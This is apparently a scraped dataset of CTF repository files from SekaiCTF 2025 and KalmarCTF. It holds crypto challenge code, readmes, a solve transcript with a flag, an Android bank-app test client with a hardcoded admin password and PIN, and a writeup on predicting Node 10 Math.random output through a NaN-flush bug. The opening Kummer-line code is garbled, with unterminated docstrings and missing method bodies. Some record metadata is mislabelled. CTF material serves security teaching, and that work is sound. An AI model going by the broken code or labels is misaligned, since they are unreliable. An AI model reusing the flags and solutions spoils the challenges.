Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coefficient A as a tuple\n        representing the projective form (A : C)\n        \"\"\"\n        return self._A, self._C\n\n\n    def AC(self):\n        return self.extract_constants()\n\n\n    def AC24(self):\n        A,C = self.AC()\n        return A+2*C, 4*C\n\n\n    def zero(self):\n        \"\"\"\n        Return the identity point on the Kummer Line\n        \"\"\"\n        return self(None)\n\n\n    def curve(self):\n        \"\"\"\n        Lift the Kummer Line to an elliptic curve as a\n        SageMath EllipticCurve\n        \"\"\"\n        if not self._curve:\n            self._curve = self.montgomery_curve()\n        return self._curve\n\n\n    @cached_method\n    def montgomery_curve(self):\n        \"\"\"\n        Compute the Montgomery Curve associated with the\n        Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        a = self.a()\n        return EllipticCurve(F, [0, a, 0, 1, 0])\n\n\n    @cached_method\n    def short_weierstrass_curve(self):\n        \"\"\"\n        Compute the Isomorphic curve in the short Weierstrass model\n        associated with the Kummer Line\n        \"\"\"\n        F = self.base_ring()\n        A = self.a()\n\n\n    @cached_method\n    def j_invariant(self):\n        \"\"\"\n        Compute the j-invariant of the Kummer Line\n        \"\"\"\n        j_num = 256 * (self._A**2 - 3 * self._C**2) ** 3\n        j_den = self._C**4 * (self._A**2 - 4 * self._C**2)\n        return j_num / j_den\n\n\n    @cached_method\n    def a(self):\n        \"\"\"\n        Compute the Montgomery coefficient as a value\n        in the base field\n        \"\"\"\n        return self._A / self._C\n\n\n    def __init__(self, parent, coords):\n        # Ensure the parent is the right type\n        if not isinstance(parent, KummerLine):\n            raise TypeError(\"not a Montgomery Kummer line\")\n\n\n        # Point at infinity\n        if coords is None:\n            coords = (Integer(1), Integer(0))\n        # Construct point from P on an elliptic curve in Montgomery form\n        elif isinstance(coords, EllipticCurvePoint_field):\n            # Make sure point's parent curve matches with Kummer Line\n            a = parent.a()\n            assert coords.curve().a_invariants() == (0, a, 0, 1, 0)\n            coords = coords[0], coords[2]\n        # Construct from X coordinate only\n        elif isinstance(coords, RingElement):\n            coords = (coords,)\n        # Construct from a tuple (X : Z)\n        else:\n            coords = tuple(coords)\n\n\n    def __repr__(self):\n        return f\"[{self._X} : {self._Z}]\"\n        # return f\"Kummer Point [{self._X} : {self._Z}] on {self._parent}\"\n\n\n    def __bool__(self):\n        \"\"\"\n        A point represents False if it is the point at infinity and\n        True otherwise\n        \"\"\"\n        return bool(self._Z)\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Equality of two Kummer Points\n        \"\"\"\n        if not isinstance(other, KummerPoint):\n            raise ValueError(\"Can only compare equality between to Kummer Points\")\n        if self._parent != other._parent:\n            return False\n        return self._X * other._Z == other._X * self._Z\n\n\n    def is_zero(self):\n        \"\"\"\n        A Kummer Point is considered Zero if it is the identity point\n        on the parent curve\n        \"\"\"\n        return self._Z == 0\n\n\n    def base_ring(self):\n        \"\"\"\n        Get the base ring of the Kummer Point coordinates\n        \"\"\"\n        return self._base_ring\n\n\n    def parent(self):\n        \"\"\"\n        Get the Kummer Line of which this point is constructed on\n        \"\"\"\n        return self._parent\n\n\n    def XZ(self):\n        \"\"\"\n        Return the projective (X : Z) coordinates of the point\n        \"\"\"\n        return self._X, self._Z\n\n\n    def X(self):\n        return self._X\n    def Z(self):\n        return self._Z\n\n\n    def __iter__(self):\n        return iter(self.XZ())\n\n\n    def x(self):\n        r\"\"\" \"\"\"\n        if not self._Z:\n            raise ValueError(\"The identity point has no valid x-coordinate\")\n        if self._Z == 1:\n            return self._base_ring(self._X)\n        return self._base_ring(self._X / self._Z)\n\n\n    @cached_method\n    def curve_point(self):\n        \"\"\"\n        Deterministically lift an x-coordinate\n        taking the smallest y-coordinate as the\n        chosen root.\n        \"\"\"\n        # Get the Montgomery curve and constant A\n        L = self.parent()\n        E = L.curve()\n        A = L.a()\n\n\n    @staticmethod\n    def xDBL(X, Z, A, C):\n        \"\"\"\n        function for Montgomery doubling with projective curve constant\n\n\n    @staticmethod\n    def xADD(XP, ZP, XQ, ZQ, xPQ, zPQ):\n        \"\"\"\n        function for Montgomery differential addition\n\n\n    @staticmethod\n    def xDBLADD(XP, ZP, XQ, ZQ, xPQ, zPQ, A24, C24):\n        \"\"\"\n        function for step in Montgomery ladder\n        simultaneous doubling and differential addition\n\n\n    @staticmethod\n    def xTPL(XP, ZP, A2):\n        \"\"\"\n        SIKE algorithm 46\n\n\n    def _double(self):\n        \"\"\"\n        Returns [2] self\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        X2, Z2 = self.xDBL(X, Z, A, C)\n        return self._parent((X2, Z2))\n\n\n    def double(self):\n        \"\"\"\n        Wrapper function which deals with the doubling of\n        the identity\n\n\n    def _double_iter(self, n):\n        \"\"\"\n        Returns [2^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        for _ in range(n):\n            X, Z = self.xDBL(X, Z, A, C)\n        return self._parent((X, Z))\n\n\n    def double_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        doubling\n\n\n    def _triple_iter(self, n):\n        \"\"\"\n        Returns [3^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        A = A / (2 * C)\n        for _ in range(n):\n            X, Z = self.xTPL(X, Z, A)\n        return self._parent((X, Z))\n\n\n    def triple_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        tripling\n\n\n    def _add(self, Q, PQ):\n        \"\"\"\n        Performs differential addition assuming\n        P, Q and PQ are all not the point at\n        infinity\n        \"\"\"\n        XP, ZP = self.XZ()\n        XQ, ZQ = Q.XZ()\n        XPQ, ZPQ = PQ.XZ()\n\n\n    def add(self, Q, PQ):\n        \"\"\"\n        Function to perform differential addition and\n        handle the cases when P, Q or PQ are the points\n        at infinity\n        \"\"\"\n        # Adding O + Q = Q\n        if not self._Z:\n            return Q\n\n\n    def __mul__(self, m):\n        \"\"\"\n        Montgomery-ladder to compute [m]P\n\n\n    def __rmul__(self, m):\n        return self * m\n\n\n    def __imul__(self, m):\n        self = self * m\n        return self\n\n\n    def ladder_3_pt(self, xP, xPQ, m):\n        \"\"\"\n        Function to compute xP + [m]xQ using x-only\n        arithmetic. Very similar to the Montgomery ladder above\n\n\n    def multiples(self):\n        \"\"\"\n        A generator of points [l]P for self = P\n        Stops when it has generated the full subgroup generated by P\n        (without the identity point).\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\challenge\\app\\montgomery_isogenies\\kummer_line.py", "file_size": 37056, "scraped_at": "2025-10-26T18:19:39.795612"}
{"id": "project-sekai_sekaictf-2025_============================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "============================================ #", "attack_type": "Unknown", "writeup": "# ============================================ #\n#     Fast square root and quadratic roots     #\n# ============================================ #\n\n\ndef sqrt_Fp2(a):\n    \"\"\"\n    Efficiently computes the sqrt\n    of an element in Fp2 using that\n    we always have a prime p such that\n    p ≡ 3 mod 4.\n    \"\"\"\n    Fp2 = a.parent()\n    p = Fp2.characteristic()\n    i = Fp2.gen()  # i = √-1\n\n    a1 = a ** ((p - 3) // 4)\n    x0 = a1 * a\n    alpha = a1 * x0\n\n    if alpha == -1:\n        x = i * x0\n    else:\n        b = (1 + alpha) ** ((p - 1) // 2)\n        x = b * x0\n\n    return x\n\n\ndef quadratic_roots(b, c):\n    \"\"\"\n    Computes roots to the quadratic polynomial\n\n        f = x^2 + b * x + c\n\n    Using the quadratic formula\n\n    Just like in school!\n    \"\"\"\n    d2 = b**2 - 4 * c\n    d = sqrt_Fp2(d2)\n    return ((-b + d) / 2, -(b + d) / 2)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\challenge\\app\\utilities\\fast_roots.py", "file_size": 841, "scraped_at": "2025-10-26T18:19:39.797478"}
{"id": "project-sekai_sekaictf-2025_solve_transcript", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "solve transcript", "attack_type": "Unknown", "writeup": "> python idog.py\nEnter an 8-digit multiplicand: 49228443\nEnter a 7-digit multiplier: 9773647\nHere is your flag: SEKAI{iSOgenni_in_mY_D1234M5;_iS_it_T00_s00n}", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\i-dream-of-genni\\solution\\solve_transcript.txt", "file_size": 157, "scraped_at": "2025-10-26T18:19:39.806690"}
{"id": "project-sekai_sekaictf-2025_client", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "client", "attack_type": "Unknown", "writeup": "from typing import Callable\nfrom type import Status\nfrom config import Config\n\nfrom lamda.client import *\nfrom lamda.const import *\n\nimport time\nfrom datetime import datetime, timedelta\n\nPACKAGE_NAME = \"com.sekai.bank\"\nCHALLENGE_NAME = \"SekaiBank\"\nTIMEOUT = 60 * 5\n\nACCOUNT_USERNAME = \"admin\"\nACCOUNT_PASSWORD = \"Admin123#S3k4i\"\nACCOUNT_PIN = \"443123\"\n\nUSERNAME_TO_SEND = \"nino\"\nAMOUNT_TO_SEND = 10\nAMOUNT_TO_SEND_DELAYED = 100\n\nUI_TIMEOUT = 10*1000\n\ndevice = Device(\"localhost\")\n\ndef scroll_until_exists(element):\n    while not element.exists():\n        device.swipe(Point(x=30, y=800), Point(x=30, y=650))\n\ndef start_app():\n    vuln_app = device.application(PACKAGE_NAME)\n    vuln_app.start()\n\n    return vuln_app\n\ndef stop_if_running():\n    running_apps = device.enumerate_running_processes()\n    for app in running_apps:\n        if app.packages[0] == PACKAGE_NAME:\n            device.application(app.packages[0]).stop()\n\n    device.execute_script(f'pkill {PACKAGE_NAME}')\n\ndef login_if_needed():\n    if device(resourceId=\"com.sekai.bank:id/sekai_subtitle\").exists():\n        username_input = device(resourceId=\"com.sekai.bank:id/username_input\")\n        username_input.set_text(ACCOUNT_USERNAME)\n\n        password_input = device(resourceId=\"com.sekai.bank:id/password_input\")\n        password_input.set_text(ACCOUNT_PASSWORD)\n\n        auth_button = device(resourceId=\"com.sekai.bank:id/auth_button\")\n        auth_button.click()\n\ndef enter_pin_on_login():        \n    device(text=\"Enter your PIN to access your account\").wait_for_exists(UI_TIMEOUT)\n\n    pin_buttons = []\n    for i in range(0, 9):\n        pin_buttons.append(device(resourceId=f\"com.sekai.bank:id/pin_button_{i}\"))\n\n    for c in ACCOUNT_PIN:\n        pin_buttons[int(c)].click()\n        time.sleep(0.1)\n\ndef enter_pin_on_sendmoney():\n    device(text=\"Enter your PIN to continue\").wait_for_exists(UI_TIMEOUT)\n    \n    pin_buttons = []\n    for i in range(0, 9):\n        pin_buttons.append(device(resourceId=f\"com.sekai.bank:id/pin_button_{i}\"))\n    \n    for c in ACCOUNT_PIN:\n        pin_buttons[int(c)].click()\n        time.sleep(0.1)\n\ndef go_to_sendmoney_menu():\n    nav_send = device(resourceId=\"com.sekai.bank:id/nav_send\")\n    nav_send.wait_for_exists(UI_TIMEOUT)\n    nav_send.click()\n\n    device(text=\"Transfer money to another user securely\").wait_for_exists(UI_TIMEOUT)\n\ndef send_money():\n    go_to_sendmoney_menu()\n\n    recipient_input = device(resourceId=\"com.sekai.bank:id/recipient_input\")\n    recipient_input.set_text(USERNAME_TO_SEND)\n\n    amount_input = device(resourceId=\"com.sekai.bank:id/amount_input\")\n    amount_input.set_text(str(AMOUNT_TO_SEND))\n\n    schedule_checkbox = device(resourceId=\"com.sekai.bank:id/schedule_checkbox\")\n    if schedule_checkbox.info().checked:\n        schedule_checkbox.click()    \n\n    send_button = device(resourceId=\"com.sekai.bank:id/send_button\")\n    scroll_until_exists(send_button)\n    send_button.click()\n\n    confirm_button = device(text=\"Confirm\")\n    confirm_button.wait_for_exists(UI_TIMEOUT)\n    confirm_button.click()\n\n    enter_pin_on_sendmoney()\n\ndef send_scheduled_money():\n    go_to_sendmoney_menu()\n\n    recipient_input = device(resourceId=\"com.sekai.bank:id/recipient_input\")\n    recipient_input.set_text(USERNAME_TO_SEND)\n\n    amount_input = device(resourceId=\"com.sekai.bank:id/amount_input\")\n    amount_input.set_text(str(AMOUNT_TO_SEND_DELAYED))\n\n    schedule_checkbox = device(resourceId=\"com.sekai.bank:id/schedule_checkbox\")\n    if not schedule_checkbox.info().checked:\n        schedule_checkbox.click()    \n\n    date_picker_button = device(resourceId=\"com.sekai.bank:id/date_picker_button\")\n    date_picker_button.wait_for_exists(UI_TIMEOUT)\n    date_picker_button.click()\n\n    date = device.execute_script('date').stdout.decode().strip()\n    dt = datetime.strptime(date, \"%a %b %d %H:%M:%S %Z %Y\")\n    dt_plus_5m = dt + timedelta(minutes=5)\n\n    button1 = device(resourceId=\"android:id/button1\")\n    button1.wait_for_exists(UI_TIMEOUT)\n\n    date_button = device(text=str(dt_plus_5m.day), clickable=True, enabled=True)\n    date_button.click()\n\n    button1.click()\n\n    time_picker_button = device(resourceId=\"com.sekai.bank:id/time_picker_button\")\n    time_picker_button.wait_for_exists(UI_TIMEOUT)\n    time_picker_button.click()    \n\n    toggle_mode = device(resourceId=\"android:id/toggle_mode\")\n    toggle_mode.wait_for_exists(UI_TIMEOUT)\n    toggle_mode.click()\n\n    device(text=\"Set time\").wait_for_exists(UI_TIMEOUT)\n\n    input_hour = device(resourceId=\"android:id/input_hour\")\n    input_hour.set_text(str(dt_plus_5m.hour))\n\n    input_minute = device(resourceId=\"android:id/input_minute\")\n    input_minute.set_text(str(dt_plus_5m.minute))\n\n    button1 = device(resourceId=\"android:id/button1\")\n    button1.wait_for_exists(UI_TIMEOUT)\n    button1.click()\n\n    send_button = device(resourceId=\"com.sekai.bank:id/send_button\")\n    scroll_until_exists(send_button)\n\n    send_button.click()\n\n    confirm_button = device(text=\"Confirm\")\n    confirm_button.wait_", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\misc\\sekai-bank-transaction\\challenge\\poc-tester\\poc-web\\src\\challenges\\SekaiBank\\client.py", "file_size": 5595, "scraped_at": "2025-10-26T18:19:39.829418"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Zero-knowledge proofs are pretty dank bro,\nin early 90ties Goldwasser et al. showed that you prove every satisfied NP relation in ZK,\nin late 2010s blockchain people showed us this result extends to false NP instances.\nCool stuff.\n\n\nIncluded source code, as well as the binary running on remote.", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Yoloproofs\\public_handout\\handout\\readme.md", "file_size": 295, "scraped_at": "2025-10-26T18:19:59.104672"}
{"id": "kalmar_kalmarctf_Change_Log", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "Change Log", "attack_type": "AES", "writeup": "#  Change Log\n\n## 0.3.0 (2202-12-23)\n\n* Fixed bug with wrong round function at end.\n* Made AES more even better for business.\n\n## 0.2.1 (2022-11-03)\n* Export more constant.\n* Update document.\n\n## 0.2.0 (2022-11-01)\n* **BREAK CHANGES**: function name changed!\n* Improve performance (internal implementation changed).\n* Add in-place functions for low-level API.\n* Look-up-tables are calculated in compile time.\n\n## 0.1.5 (2019-06-16)\n* Improve performance (very little).\n\n## 0.1.4 (2019-01-08)\n* Add Experimental CFB8 mode (CFB mode with 8-bit feedback, not previous 128-bit) support. (issues #2)\n* Remove unnecessary asserts in Doc-tests.\n* Little words fix in doc.\n\n## 0.1.3 (2019-01-07)\n* Fix warnings on CFB example code. (issues #1)\n* Using Rust Edition 2018.\n* Add my name to LICENSE file.\n* Little words fix in doc.\n\n## early version\n* README.md and Cargo.toml modifications.\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\telepound\\public_handout\\handout\\aes_frast\\CHANGELOG.md", "file_size": 881, "scraped_at": "2025-10-26T18:19:59.118673"}
{"id": "kalmar_kalmarctf_aes_frast", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "aes_frast", "attack_type": "AES", "writeup": "# aes_frast\n**NOT for Serious Usage**  \n`aes_frast` is an easy-to-use lib for AES encryption and decryption, coded in pure safe Rust-lang. The AES algorithm is implemented by looking-up-tables.  \nIn the name `aes_frast`, \"frast\" is a mix of the words \"rust\" and \"fast\". These lib is designed to run as fast as possible on pure Rust-lang code, no ASM.  \n\n## Compatibility\nFunctions in this lib is **compatible** with [OpenSSL] if they can be found in [OpenSSL] although maybe in different names.  \n\n## Security\nAny cryptographic audit of this lib has **NEVER** been conducted. So, please be extremely careful when you are looking for high security.  \nThe author tries to make it more secure, but **never gives any guarantee** of security.  \nIn addition, some researches have reported that there could be timing problems in looking-up-tables implement. However, this lib assumes that the computers which run the lib are secure and users of this lib have done something to avoid the timing problems. Usages like file encryption may be suitable.\n**Maybe, this lib is for somebody who just wants to know the structure of AES.**\n\n## Features\n* 128bit, 192bit, 256bit key-size and fixed 128bit block-size.\n* ECB, CBC, CFB, OFB operation mode (with experimental PCBC mode and CFB8 mode).\n* ANSIX923, PKCS #7, Zeros padding and depadding.\n* Single-block process.\n* Working keys scheduling.\n\n## Examples\nPlease see the doc.\n\n## Next version? \\[HELP-WANTED\\]\nIn the future, what will the lib be?  \nI don't know.  \nMaybe the following will be considered, maybe not:  \n1. CTR and GCM operation modes.\n2. Hash functions and HMAC.\n3. PBKDF2 and other key derivation functions.\n4. FFI.\n5. Try to speed up!\n6. More security and audits if possible.\n\n**Pull requests are always welcome.** Thank all of you.\n\n[OpenSSL]: https://www.openssl.org/", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\telepound\\public_handout\\handout\\aes_frast\\README.md", "file_size": 1824, "scraped_at": "2025-10-26T18:19:59.134428"}
{"id": "kalmar_kalmarctf_README", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "README", "attack_type": "Unknown", "writeup": "### README\nhttps://www.iacr.org/archive/crypto2000/18800272/18800272.pdf Claims to be provably secure, what could possible go wrong ^^\n\nWe recommend you develop your exploit locally, and have provided you with a docker setup to help :)\n\nTo build, use the command `docker build -t blindsign ./` in the folder.\nTo run, use use the command `docker run -p 4343:4343 --name blindsign blindsign`to run the server, listening on localhost on port 4343. \nYou can now communicate with it using nc, or through python using pwntools/telnet. The server receives and sends JSON, which can easily be converted to/from python dictionaries using `json.dumps()` and `json.load()`.\n\nNote that the checkout of the library used is this branch https://github.com/rot256/pblind/tree/serial. (This was just for ease of interacting with the challenge, and shouldn't have any influence on solving compared to master branch.)\n\nNote: The remote server will be restarted periodically. If you are 100% sure you have an efficient reliable solution which works locally, but are having issues with remote due to connection problems, reach out to an admin and we can try and help.", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Blind_security\\public_handout\\ctfdhandout\\readme.md", "file_size": 1146, "scraped_at": "2025-10-26T18:19:59.150624"}
{"id": "kalmar_kalmarctf_solution", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "solution", "attack_type": "Unknown", "writeup": "To run the solve script, edit `CHAL_ADDR` in `solution/src/main.rs` to point it at the server, then execute `cargo run` in the `solution/` directory.\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2024\\crypto\\breakfaest\\solution.md", "file_size": 150, "scraped_at": "2025-10-26T18:19:59.160636"}
{"id": "kalmar_kalmarctf_short_circuit", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "short circuit", "attack_type": "XOR", "writeup": "# short circuit\n\n**Author**: Astrid  \n**Flag**: `kalmar{n3v3r_f1u5h_y0ur_NaNs_d0wn_th3_dr41n}`  \n\n## Setup\nThe challenge generates a 12-word seed phrase from the [BIP39 word list](https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt) using `Math.random()`, and asks the user to guess it. As a hint, the challenge provides the first letter of the first 5 words.\n\nWith 2048 words, there's `log2(2048^12)` = 132 bits of entropy (I believe the real BIP39 spec includes some sort of checksum, but we're not). The hint provides `log2(26^5)` ≈ 23.5 bits of entropy (assuming a uniform distribution, which there probably isn't). Either way, it's astronomically unlikely you'll guess the right seed phrase randomly just based on the hint.\n\nEven if you know that `Math.random()` is cryptographically insecure, you still need at least 128 known bits to solve for the internal RNG state in the first place. There's simply too many possible states that result in the output you get for it to be feasible to guess.\n\nSo this challenge is impossible... right?\n\n## Node 10\nIf you look closely at the provided Dockerfile, you'll see that it uses the image `node:10-alpine`. Node.js 10 was released in [April 2018](https://nodejs.org/en/blog/release/v10.0.0), and the v10 release went end-of-life in [May 2020](https://endoflife.date/nodejs), with the last security release (v10.24.1, the one in the Docker image) releasing in [April 2021](https://nodejs.org/en/blog/release/v10.24.1). This is a suspiciously *old* version of Node.js! Perhaps the random number generator was (even more) broken back then?\n\nIf you analyze the output of Math.random(), or search the Chromium bug tracker hard enough, you'll stumble upon [issue #42211416: \"Math.random() returns biased results due to states being flushed to NAN, and after ~10s a totally fixed sequence\"](https://issues.chromium.org/issues/42211416). The issue description explains it better than I could:\n\n> The current Math.random() implementation is biased initially and then returns a fixed sequence. Internally math.random() uses xorshift128+, which has a 64 long array to store its internal data, where the last two elements in the array are the seeds. This array is composed of boxed (? I'm unsure of the terminology here) doubles. To store the two uint64_t seeds in the array, each seed is reinterpret_cast'ed as doubles before being stored into the array\n> \n> Because the array is an array of boxed doubles, each double is checked for being nan before being set into the array. If it *is* any kind of nan, its set to the canonical nan representation before being stored\n> \n> This is a problem because it means that if either seed in the array reinterpreted as a double is NAN in that format, it gets set to just the one NAN representation. This means in practice, it is relatively common (1/50000 occurance in testing, but whatever the probability is that any of the two seeds is nan / 62) that a range of seeds are flushed to a specific known value, which makes the generator probably biased as nearly half your state is being discarded intermittently, with more state being discarded over time\n> \n> From a time based perspective, one seed being nan is common enough that it will occur multiple times if you run math.random() for ~100ms\n> \n> If both seeds are nan due to this, the generator will revert to a predefined sequence that is generated. This is quite bad, as after ~10 seconds at the most the generator will revert to a predefined state and produced a fixed sequence of numbers\n> \n> To provide an example, the seed sequence s0 = 3873826803242720369, s1 = 3475268073314572095 should transform to s0 = 3475268073314572095, s1 = 9221203049127997123, but due to this s1 is 9221120237041090560 (NAN)\n>\n> ---\n>\n> Additionally this means that xorshift128+ as implemented only has a period of 682927953 (once this bug is hit), as found by counting until that number repeats again\n\nWhich means that you can abuse this bug in order to massively reduce the possible state space!\n\nOf course, this requires that the bug is hit *on the server*, and the RNG state enters the fixed sequence.\n\nHow convenient, then, that the source includes this line at the start:\n\n```js\nfor (let i = 0; i < 13371337; i++)\n    Math.random();\n```\n\nThe bug can trigger every 62 rolls (as that's how big a batch the implementation generates numbers in), and there's a 1/2048 chance the state will encode to a NaN double (the 11 exponent bits all need to be 1s). So on average, it'd take `1/(2048^2 * 62)` (or about 260 million) rolls for the bug to trigger for both state values at once, forcing the RNG into a fixed cycle. Since we step the RNG 13,371,337 rolls on startup, there's about a 5% chance that the seed phrase will be generated from somewhere within the cycle.\n\nThe period in terms of Math.random() calls is 682,927,953 (according to the bug tracker), but we have a slight advantage here: since we always step the same amount of rolls on startup, the seed phrase i", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2025\\crypto\\short-circuit\\solution\\README.md", "file_size": 6045, "scraped_at": "2025-10-26T18:19:59.175357"}
{"id": "kalmar_kalmarctf_challenge_file", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "challenge file", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext):\n    key = os.urandom(len(cleartext))\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\EasyOneTimePad\\public\\challenge_file.py", "file_size": 1743, "scraped_at": "2025-10-26T18:19:59.189249"}
{"id": "kalmar_kalmarctf_\"EasyOneTimePad\"_challenge_for_KalmarCTF_2023", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "\"EasyOneTimePad\" challenge for KalmarCTF 2023", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n\n# \"EasyOneTimePad\" challenge for KalmarCTF 2023\n# by shalaamum\n\nimport os\n\nPASS_LENGTH_BYTES = 128\n\ndef encrypt_otp(cleartext):\n    key = os.urandom(len(cleartext))\n    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])\n    return ciphertext, key\n\n\nif __name__ == '__main__':\n    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "solution_code": "    print('According to Wikipedia:')\n    print('\"In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.\"')\n    print('So have fun trying to figure out my password!')\n    password = os.urandom(PASS_LENGTH_BYTES)\n\n\n    enc, _ = encrypt_otp(password)\n    print(f'Here is my password encrypted with a one-time pad: {enc.hex()}')\n    print('Actually, I will give you my password encrypted another time.')\n    print('This time you are allowed to permute the password first')\n    permutation = input('Permutation: ')\n    try:\n        permutation = [int(x) for x in permutation.strip().split(',')]\n        assert len(permutation) == PASS_LENGTH_BYTES\n        assert set(permutation) == set(range(PASS_LENGTH_BYTES))\n        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))\n        print(f'Here is the permuted password encrypted with another one-time pad: {enc.hex()}')\n    except:\n        print('Something went wrong!')\n        exit(1)\n    password_guess = input('What is my password: ')\n    try:\n        password_guess = bytes.fromhex(password_guess)\n    except:\n        print('Something went wrong!')\n        exit(1)\n    if password_guess == password:\n        with open('flag.txt', 'r') as f:\n            flag = f.read()\n            print(f'The flag is {flag}')\n    else:\n        print('Nope.')\n", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\EasyOneTimePad\\solution\\challenge.py", "file_size": 1807, "scraped_at": 